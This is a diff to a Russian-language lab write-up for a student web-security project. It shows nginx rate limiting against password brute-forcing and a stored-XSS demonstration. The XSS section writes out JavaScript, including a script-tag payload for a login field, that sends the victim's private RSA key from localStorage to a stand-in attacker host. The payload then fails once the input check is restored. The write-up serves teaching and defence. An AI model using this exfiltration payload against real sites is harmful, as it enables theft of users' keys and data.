@@ -96,10 +96,11 @@ function checkUser(userId, password, callback) {
 
 ### Перебор пароля
 Злоумышленник может попробовать перебрать пароль к приложению, например посмотрев каким образом происходит авторизация:
+
 ![brute1](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/brute1.jpg)
 ![brute2](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/brute2.jpg)
 
-Но тут он столкнется с ограничением количества попыток авторизации:
+И может написать скрип для перебора пароля к сервису. Но тут он столкнется с ограничением количества попыток авторизации:
 ![brute3](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/brute3.jpg)
 
 Как видно из скрина, после нескольких попыток авторизации, веб-сервер возвращает **503** ошибку. Реализовано это на уровне веб-сервера **nginx**. С помощью опций **limit_req_zone** и **limit_req** (подробнее можно узнать из [документации](http://nginx.org/en/docs/http/ngx_http_limit_req_module.html)) в [конфигурации nginx](docker/nginx/default.conf):
@@ -120,5 +121,70 @@ server {
 ```
 
 ### XSS
-Авторизоаванный в веб-приложении злоумышленник может попробовать атаковать пользователя с помощью **XSS** атаки.
+Если у зломышленника получится перехватить сессию и авторизоваться в веб-приложении под пользователем. Он все равно не получит секретных данных пользователя:
+
+![xss1](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/xss1.jpg)
+
+На скрине видно, как злоумышленник использовал перехваченные cookie, для того чтобы получить все сохраненные в приложении пароли пользователя. Но поле пароля зашифрованно приватным RSA ключом, которого нет у злоумышленника. Но он может знать, что даннный ключ хранится в **localStorage** в браузере пользователя. И попытается добыть эти данные эксплуатируя XSS уязвимость.
+
+Например он может попытаться добавить javascript код на страницу, который отправляет ему ключ пользователя, Например:
+```javascript
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "http://evil.saveleva.ml", true);
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhr.send(localStorage.getItem("key"));
+```
+
+Если этот скрипт выполнится на странице пользователя, то он отправит приватный RSA ключ злоумышленнику по адресу http://evil.saveleva.ml. А затем с помощью него расшифровать данные.
+
+Он может попытаться создать новый сервис и в поле логина вставить этот скрипт. Опять же используя перехваченную сессию
+
+![xss2](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/xss2.jpg)
+
+\"><script>var xhr = new XMLHttpRequest();xhr.open(\"POST\", \"http://evil.saveleva.ml\", true);xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");xhr.send(localStorage.getItem(\"key\"));</script>
+
+За добавление сервиса отвечает функция **addService** [из модуля api.js](modules/api.js)
+```javascript
+function addService(userId, service, login, password, newService, newLogin, callback) {
+	getPublicKey(userId, (publicKeyPem) => {
+		let publicKey = forge.pki.publicKeyFromPem(publicKeyPem);
+		if(validate.checkEmptyAndXss([service, login, password, newService, newLogin])) {
+			password = forge.util.encode64(publicKey.encrypt(password));
+			db.query(
+				'INSERT INTO passwords VALUES(?, ?, ?, ?) ON DUPLICATE KEY UPDATE password = ?, service = ?, login = ?',
+				[userId, service, login, password, password, newService, newLogin],
+				(res, err) =>
+				{
+					if(err) {
+						callback(false);
+					} else {
+						callback(true);
+					}
+				});
+		} else {
+			console.error('service or login or password is empty');
+			callback(false);
+		}
+	});
+}
+```
+
+Если убрать проверку **validate.checkEmptyAndXss** злоумышленник сможет внедрить сторонний javascript код на страницу. Предположем что данной проверки нет, тогда выше указанный http запрос выполнится успешно и в базу запишется вместо логина вредоносный javascript код.
+
+Убираем проверки, убеждаемся что вредоноснвый код успешно записан в базу:
+![xss5](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/xss5.jpg)
+
+Когда пользователь зайдет на страницу приложения, его ключ отправится злоумышленнику:
+
+![xss3](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/xss3.jpg)
+![xss4](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/xss4.jpg)
+
+А теперь вернем проверку данных на XSS и убедимся, что злоумышленник не сможет такое провернуть снова:
+![xss6](https://github.com/nsaveleva/lab4_web_secure/raw/master/docs/images/xss6.jpg)
+
+Вот теперь все отлично! Сервер вернул ошибку "Wrong data".
+
+
+### Перехват трафика между клиентом и сервером
+Злоумышленник также может попытаться перехватить трафик между клиентов и серверов. Если ему удастся словить момент атвторизации пользователя, тогда он сможет узнать его пароль.
 
